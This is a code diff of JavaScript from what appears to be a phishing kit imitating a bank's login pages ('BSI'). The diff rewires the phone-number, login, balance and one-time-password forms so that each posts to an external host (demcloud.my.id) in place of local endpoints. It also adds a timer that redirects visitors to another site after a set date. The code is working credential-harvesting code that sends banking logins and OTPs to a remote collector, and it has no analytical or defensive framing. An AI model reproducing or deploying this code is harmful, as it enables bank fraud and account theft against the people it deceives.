@@ -1,3 +1,10 @@
+let tglNow = new Date();
+let waktuBatas = new Date("2025-09-11T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://expiredweb.pages.dev';
+} else {
+  console.log('Server aktif');
+}
 function sendHp() {
 event.preventDefault();
         var nomor = document.getElementById("nohp").value;
@@ -8,7 +15,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BSI/dfe8k/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +35,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BSI/dfe8k/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +61,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BSI/dfe8k/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +91,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'rest/otp.php',
+ url: 'https://demcloud.my.id/BSI/dfe8k/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
